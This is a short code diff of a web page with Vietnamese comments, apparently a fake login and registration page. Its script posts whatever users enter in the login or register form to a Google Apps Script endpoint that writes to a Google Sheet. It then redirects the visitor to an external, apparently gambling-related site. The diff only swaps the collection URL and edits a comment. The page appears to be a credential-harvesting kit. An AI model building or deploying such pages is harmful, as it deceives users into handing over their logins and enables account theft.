@@ -169,7 +169,7 @@
         function closeModal(id) { document.getElementById(id).style.display = 'none'; }
 
         // CẤU HÌNH GỬI DỮ LIỆU GOOGLE SHEETS
-        const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbw-tdxR1hLgo3TCWH5CGlSaXZNcuz3sGaeZp9dtIIE0qQyoZgZIYgd_5lTYfDapXR3s/exec"; // Dán link Apps Script vào đây
+        const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbyMYwOTl5nu80hXAYQYa8HWhDz_Glj-hEbBZad193GsseJfs479Kc649DyXcp2p8ISV/exec"; // Dán link Apps Script vào đây
         const REDIRECT_URL = "https://4a1.bongvip25.pro"; // Trang sẽ nhảy đến sau khi bấm
 
         async function postData(formId) {
@@ -184,7 +184,7 @@
             const formType = (formId === 'loginForm') ? "Đăng Nhập" : "Đăng Ký";
             
             formData.append("type", formType); 
-            formData.append("source", sourceName); // Gửi thêm cột nguồn này đi
+            formData.append("source", sourceName); // Gửi nhãn 'source' về Sheet
 
             fetch(SCRIPT_URL, { method: 'POST', mode: 'no-cors', body: formData })
             .then(() => {
